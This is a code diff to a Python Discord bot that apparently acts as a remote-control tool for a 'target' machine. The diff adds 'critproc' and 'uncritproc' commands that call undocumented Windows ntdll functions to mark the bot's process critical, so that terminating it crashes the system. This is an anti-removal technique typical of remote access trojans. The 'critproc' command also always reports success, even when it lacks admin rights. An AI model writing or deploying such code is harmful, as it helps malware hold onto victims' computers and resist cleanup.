@@ -1,5 +1,3 @@
-
-
 import functools
 import getpass
 import os
@@ -203,6 +201,110 @@ def is_admin():
         return ctypes.windll.shell32.IsUserAnAdmin() != 0
     else:
         return os.geteuid() == 0
+
+
+@client.command()
+async def critproc(ctx):
+    """
+        If target is Windows:
+            Usage:
+                >critproc
+
+        If target is NOT Windows (Linux):
+            Command does not support other platforms
+    """
+    try:
+        if os.name == 'nt':
+
+            # Perform the action
+            import ctypes
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin:
+                ctypes.windll.ntdll.RtlAdjustPrivilege(
+                    20, 1, 0, ctypes.byref(ctypes.c_bool()))
+                ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
+                desc = "Made the current process critical"
+            else:
+                desc = "Unable to perform action. Admin priviliages are required"
+
+            # Send embed and inform the user
+            embed = discord.Embed(
+                title=f"Critical Process",
+                description="Made the current process critical",
+                timestamp=datetime.utcnow(),
+                color=0xFF5733
+            )
+            embed.set_footer(
+                text=f'Requested by {ctx.author.name}',
+                icon_url=ctx.author.avatar_url
+            )
+            await ctx.send(embed=embed)
+        else:
+            embed = discord.Embed(
+                title=f"Critical Process",
+                description=f"**Error:** {platform.system()} is not supported",
+                timestamp=datetime.utcnow(),
+                color=0xff0000
+            )
+            embed.set_footer(
+                text=f'Requested by {ctx.author.name}',
+                icon_url=ctx.author.avatar_url
+            )
+            await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(str(e))
+        return
+
+
+@client.command()
+async def uncritproc(ctx):
+    """
+        If target is Windows:
+            Usage:
+                >uncritproc
+
+        If target is NOT Windows (Linux):
+            Command does not support other platforms
+    """
+    try:
+        if os.name == 'nt':
+
+            # Perform the action
+            import ctypes
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if is_admin:
+                ctypes.windll.ntdll.RtlSetProcessIsCritical(0, 0, 0) == 0
+                desc = "Made the current process uncritical"
+            else:
+                desc = "Unable to perform action. Admin priviliages are required"
+
+            # Send embed and inform the user
+            embed = discord.Embed(
+                title=f"UnCritical Process",
+                description=desc,
+                timestamp=datetime.utcnow(),
+                color=0xFF5733
+            )
+            embed.set_footer(
+                text=f'Requested by {ctx.author.name}',
+                icon_url=ctx.author.avatar_url
+            )
+            await ctx.send(embed=embed)
+        else:
+            embed = discord.Embed(
+                title=f"UnCritical Process",
+                description=f"**Error:** {platform.system()} is not supported",
+                timestamp=datetime.utcnow(),
+                color=0xff0000
+            )
+            embed.set_footer(
+                text=f'Requested by {ctx.author.name}',
+                icon_url=ctx.author.avatar_url
+            )
+            await ctx.send(embed=embed)
+    except Exception as e:
+        await ctx.send(str(e))
+        return
 
 
 @client.command()
